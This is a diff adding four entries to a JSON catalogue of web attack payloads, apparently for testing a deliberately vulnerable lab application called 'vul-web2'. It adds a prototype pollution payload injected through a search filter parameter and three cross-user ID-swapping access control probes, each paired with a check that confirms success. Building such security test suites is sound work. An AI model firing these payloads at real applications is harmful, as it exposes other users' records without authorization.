@@ -453,6 +453,69 @@
           "verifiedOn": "vul-web2-daehan"
         }
       ]
+    },
+    {
+      "vulnType": "prototype_pollution",
+      "cwe": "CWE-1321",
+      "target": { "application": "vul-web2", "endpoint": "GET /api/search" },
+      "payloads": [{
+        "payloadId": "json5-inherited-filter",
+        "value": "{__proto__:{type:\"notice\",limit:1}}",
+        "injectionPoint": { "parameter": "filters", "location": "query" },
+        "successCheck": {
+          "method": "http", "signal": ["inheritedFilterApplied"],
+          "expect": { "observe": "httpResponse", "attack": { "resultCount": 1, "contains": "\"type\":\"notice\"" } }
+        },
+        "verifiedOnVulWeb1": "not_applicable", "verifiedOn": "vul-web2-daehan"
+      }]
+    },
+    {
+      "vulnType": "broken_access_control",
+      "cwe": "CWE-285",
+      "target": { "application": "vul-web2", "endpoint": "GET /api/admissions/partner/applications/:id" },
+      "payloads": [{
+        "payloadId": "partner-cross-owner-read",
+        "value": "3",
+        "injectionPoint": { "parameter": "id", "location": "path" },
+        "successCheck": {
+          "method": "http", "signal": ["accessGranted"],
+          "expect": { "observe": "httpResponse", "baseline": { "contains": "\"partner_user_id\":4" },
+            "attack": { "contains": "\"partner_user_id\":5" } }
+        },
+        "verifiedOnVulWeb1": "not_applicable", "verifiedOn": "vul-web2-daehan"
+      }]
+    },
+    {
+      "vulnType": "broken_access_control",
+      "cwe": "CWE-285",
+      "target": { "application": "vul-web2", "endpoint": "GET /api/staff/mobile/cases/:id" },
+      "payloads": [{
+        "payloadId": "staff-cross-owner-read",
+        "value": "3",
+        "injectionPoint": { "parameter": "id", "location": "path" },
+        "successCheck": {
+          "method": "http", "signal": ["accessGranted"],
+          "expect": { "observe": "httpResponse", "baseline": { "contains": "\"staff_user_id\":4" },
+            "attack": { "contains": "\"staff_user_id\":5" } }
+        },
+        "verifiedOnVulWeb1": "not_applicable", "verifiedOn": "vul-web2-wonchang"
+      }]
+    },
+    {
+      "vulnType": "broken_access_control",
+      "cwe": "CWE-285",
+      "target": { "application": "vul-web2", "endpoint": "GET /api/mypage/requests/:id" },
+      "payloads": [{
+        "payloadId": "student-request-cross-owner-read",
+        "value": "2",
+        "injectionPoint": { "parameter": "id", "location": "path" },
+        "successCheck": {
+          "method": "http", "signal": ["accessGranted"],
+          "expect": { "observe": "httpResponse", "baseline": { "contains": "\"user_id\":2" },
+            "attack": { "contains": "\"user_id\":3" } }
+        },
+        "verifiedOnVulWeb1": "not_applicable", "verifiedOn": "vul-web2"
+      }]
     }
   ]
 }
